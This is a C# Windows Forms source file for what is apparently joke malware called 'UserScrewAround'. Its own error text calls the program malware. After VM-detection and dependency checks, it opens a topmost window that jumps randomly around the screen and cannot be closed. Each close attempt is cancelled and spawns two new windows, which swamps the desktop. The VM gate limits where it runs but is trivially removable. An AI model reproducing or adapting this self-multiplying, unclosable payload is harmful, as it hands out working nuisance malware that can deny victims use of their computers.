using System;
using System.Windows;
using System.IO;
using System.Diagnostics;
using Microsoft.Win32;
using System.Threading.Tasks;
using System.Linq;
using System.Windows.Forms;
using System.Management;

namespace BlacklistedApp
{
    public partial class UserScrewAround : Form
    {
        Random random = new Random();
        bool isVM()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private bool isInstalledDotNetCompatible()
        {
            using (RegistryKey ndpKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\NET Framework Setup\\NDP\\v4\\Full\\"))
            {
                int releaseKey = Convert.ToInt32(ndpKey.GetValue("Release"));
                if (releaseKey >= 461808)
                {
                    return true;
                }
                else
                {
                    return false;
                }
            }
        }

        private bool redistCheck()
        {
            if (File.Exists("C:\\Windows\\System32\\vcruntime140.dll"))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public UserScrewAround()
        {
            if (isInstalledDotNetCompatible() == false)
            {
                MessageBox.Show("This app requires .NET Framework 4.7.2 or later to run properly. You can download .NET from Microsoft's website", ".NET Framework Compatibility Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (redistCheck() == false)
            {
                MessageBox.Show("C++ Redist not found on your system. Download the Microsoft C++ Redists from Microsoft's website", "Redist Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            if (isVM() == false)
            {
                MessageBox.Show("You're not using a Virtual Machine, so you may not proceed. If you have been infected on your host, please email the creator at orangemanagementcorpn@gmail.com for steps to remove this malware.", "Virtual Machine Check", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Environment.Exit(0);
            }
            else
            {
                InitializeComponent();
                FormClosing += UserScrewAround_FormClosing;
                this.TopMost = true;
                Next();
            }
        }
        private void UserScrewAround_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
            new UserScrewAround().Show();
            new UserScrewAround().Show();
        }

        private async void Next()
        {
            while (true)
            {
                int width = Screen.PrimaryScreen.WorkingArea.Width;
                int height = Screen.PrimaryScreen.WorkingArea.Height;
                int x = random.Next(width);
                int y = random.Next(height);

                this.Left = x;
                this.Top = y;
                await Delay(200);
            }
        }
        private async Task Delay(int howlong)
        {
            await Task.Delay(howlong);
        }
    }
}
